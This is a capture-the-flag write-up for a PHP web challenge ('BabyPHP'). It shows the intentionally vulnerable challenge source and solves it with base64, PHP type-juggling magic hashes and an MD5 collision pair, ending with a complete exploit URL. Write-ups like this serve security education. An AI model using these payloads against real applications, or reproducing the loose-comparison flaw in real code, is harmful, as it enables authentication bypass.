# BabyPHP
### TEAM NAME: NYCP

## CATEGORY
Web

## FLAG
`WH2021{H0p3d_u_h4d_f4n_juGGl15g}`

## DESCRIPTION

## WRITEUP
Upon accessing the challenge site, we are greeted by some PHP code.

```php
<?php

// Welcome to my Super Secure PHP Server!
// Get through my various challenges to get the flag!
// Note: You DO NOT need any form of brute force or directory busting to complete this challenge!

include "flag.php";

$t = $_GET['ticket'];

if(!isset($t)) {
    highlight_file(__FILE__);
    die();
}

if ($t !== base64_encode("ILuvWH2021")) {
    die("Do you hate us?");
}

$c1 = $_GET['code1'];
$c2 = $_GET['code2'];
if(!isset($c1) || !isset($c2)) {
    die("Is that all you got?");
}

if(md5($c1) != 0 || $c2 != sha1($c2)) {
    die("Try harder!");
}

$c3 = $_GET['code3'];
if (!isset($c3) || $c3 === $c1 || $c3 != 0 || md5($c3) != md5($c1)) {
    die("Try harrrderrrr.");
}


$user = $_GET['username'];
$pass = $_GET['pass'];

if (!isset($user) || !isset($pass)) {
    die("No credentials and you want to get in?");
}

// HA! Now its salted, see how you gonna get past it!
if ($user !== $pass && md5($user.$salt) === md5($pass.$salt)) {
    die($flag);
}

?>
```

For the `ticket` parameter, we just have to set it to the base 64 representation of the string "ILuvWH2021". We can do this using [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=SUx1dldIMjAyMQ))

`ticket=SUx1dldIMjAyMQ==`


For the `code1`, `code2` and `code3` parameters, we can make use of type juggling in PHP. PHP is a loosely typed language and it exhibits a unique behaviour where a string that starts with `0e` and only consists of numbers after that is treated as a float (at least for PHP 7 and below). This is because `0e...` is the scientific notation of 0 to the exponent (or power) of ..., which always evaluates to 0.

We can do a simple search on Google for [magic hashes](https://github.com/spaze/hashes) (these are passwords that have a hash of `0e...`) and choose ones that suit our needs.

`code1=240610708&code3=QNKCDZO&code2=0e10011110011111001001100100000111011011`

For the username and password parameters, we can use a MD5 block collision where 2 different binary data have the same MD5 hash. Even better, they still produce the same hash if we append a salt to it. The payload below is urlencoded data. I have added 2 binary files (`md5_1.dat` and `md5_2.dat`) in this repo with the same binary data as below.

`username=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&pass=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`

Combining all the parameters, we have this final URL:
`http://chals.whitehacks.ctf.sg:50201/?ticket=SUx1dldIMjAyMQ==&code1=240610708&code3=QNKCDZO&code2=0e10011110011111001001100100000111011011&username=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&pass=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2`

## REFERENCES
* https://www.programmersought.com/article/2633234394/
* https://www.whitehatsec.com/blog/magic-hashes/
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md
